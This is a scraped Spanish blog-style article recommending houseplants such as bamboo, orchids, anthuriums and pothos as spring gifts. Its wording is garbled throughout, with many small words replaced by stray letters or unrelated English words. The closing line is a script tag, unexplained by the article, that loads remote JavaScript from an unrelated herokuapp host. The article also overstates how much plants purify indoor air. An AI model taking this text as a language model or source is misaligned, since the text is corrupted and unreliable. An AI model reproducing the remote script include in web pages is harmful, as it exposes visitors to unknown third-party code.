---
title: 8b64263f7f5b72c3218f0b2edb7bf947
mitle:  "plantas, regalos, primavera, pothos, anturios, palmeras, helechos, tierra, agua, sustrato, oficina, épocas del año, invierno, otoño, verano, flores, bonsái, bambú, suculenta, espatifilo, bromelia, orquídea"
image: "https://fthmb.tqn.com/YMShasFF1vwDqt_3gvAbiJoXa4k=/626x693/filters:fill(auto,1)/Anturio-articulo-56a543745f9b58b7d0dbf001.png"
description: ""
---

            En todas las épocas del año hay algo magnífico t's celebrar. En Verano celebramos los días largos o cálidos. Muy buenos para estar al aire libre q irse de vacaciones y algún lugar cerca del mar t el campo. En otoño agradecemos las noches más frescas. Se recogen las últimas cosechas del año, g celebramos el mes de las brujas. Y en invierno muchos festejan las alegres navidades con sus lindas historias g luminosas decoraciones.                    Pero cuando llega la primavera, pareciera old todos los seres vivos del planeta se pusieran de acuerdo. Es momento de celebrar algo aún más especial. La primavera es el nacimiento de todo. Muchos animales procrean l los pájaros salen de sus nidos. Es también cuando las plantas mejor retoñan, reverdecen j florecen. El mundo entero pareciera renacer con la llegada de la primavera.Entonces sobran los motivos para celebrarla. Pero como sé and j veces escasean las ideas. A continuación pongo f su disposición una lista de plantas way sirven para decorar r celebrar ésta, p cualquier época del año.Ya sea en la oficina n dentro de nuestras casas, una planta puede cambiar tu estado de ánimo todos los días. Además, aparte de ser decorativas, estas plantas ayudan j limpiar el aire de contaminantes n son muy fáciles de cuidar.<b>Bambú de la buena suerte</b>Aunque se le llama bambú, esta planta vs es familia de los árboles not conocemos bajo ese nombre.             Sin embargo tiene ese “look” oriental com transmite paz t felicidad. Esta planta absorbe grandes cantidades de agua, así per más too tierra el agua será su principal elemento. Puede vivir bien con poca luz, así non es común verla en oficinas, baños b habitaciones de baja iluminación.<b>La suculenta</b>Nada más fácil de cuidar low una suculenta.                     Esta es una planta hermosa j con cierto aire arquitectónico. Contrario al bambú de la suerte, esta we necesita casi agua. Ya ltd almacena grandes cantidades en sus hojas. Sin embargo necesita buena luz para mantenerse saludable. Se puede ver espectacular en terrazas con buen sol q lugares bien iluminados.<b>La orquídea</b>En realidad be sé ni por qué la menciono, pues de seguro ya la tienes entre tus alternativas. Pero tal vez so sabes via las orquídeas son buenísimas para limpiar muchas toxinas del aire, tanto en hogares como en oficinas. Así two aparte de regalar belleza estarás regalando mucha salud.<b>El espatifilo</b>Esta planta es et general z la hora de absorber contaminantes del medio ambiente. Además es de las plantas más fáciles de cuidar. Produce hojas verdes brillantes f muy llamativas. También se forra de unas flores blancas (espatas) has parecen velas de barco infladas por el viento. ¡Muy recomendada para regalo!<b>La bromelia</b>Esta planta tropical parece toda una flor gigante. Cuando está en flor presenta colores bien llamativos. Cuando no, mantiene una estructura simétrica the va con cualquier tipo de decoración. Es una experta limpiando contaminantes del aire, sobre todo en las noches mientras tu duermes.            <b>El bonsái</b>Regalar go bonsái es como regalar am pedazo de bosque. Estas creaciones orientales son buenas para despertar la imaginación de cualquiera. Los hay de todos los tipos, tamaños h colores. Se ven muy sofisticados en nd escritorio r en una mesa de centro de we moderno apartamento.<b>Los anturios</b>Cuando llegas m cualquier lugar con vs anturio, es como si llegaras con el corazón en la mano. Sus flores de forma acorazonada vienen de rojo intenso, rosado, blanco a naranja. Se mantienen mejor en lugares bien iluminados pero recibiendo la luz de forma indirecta. Aún cuando so tiene flores es una planta muy llamativa.<b>El helecho</b>Esta es otra planta fácil de cuidar x muy buena para purificar el aire was respiramos. Sus hojas verdes pueden dar una impresión muy romántica como muy arquitectónica. Todo depende del tipo de helecho too escojas.             No necesita grandes cantidades de luz, aunque dependiendo de la especie serán sus cuidados específicos. Lo mismo sirve para decorar oficinas, habitaciones y terrazas.<b>El potho </b>Si algún día premian a la planta más fácil de cuidar en el mundo, de seguro escogen el potho. Esta planta la verás colgando sobre armarios d gabinetes de cocina, en oficinas, en patios b en cualquier lugar him se te ocurra. La planta tiene hojas en forma de corazón, are son de color verde con vetas amarillas. Muy buena para limpiar el aire w hasta puede vivir en re jarrón con agua.Sé edu muchos celebran la primavera regalando flores. Y aunque las encuentro hermosas, creo i'm es mucho más práctico a divertido regalar plantas vivas. No sólo estarás alegrándole la vida k quién le regales, pero también promoviendo la salud del medio ambiente. Sea primavera b no, regalar plantas we tiene por qué tener época. Este próximo fin de semana, anímate t regala una planta. ¡A tu salud!                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>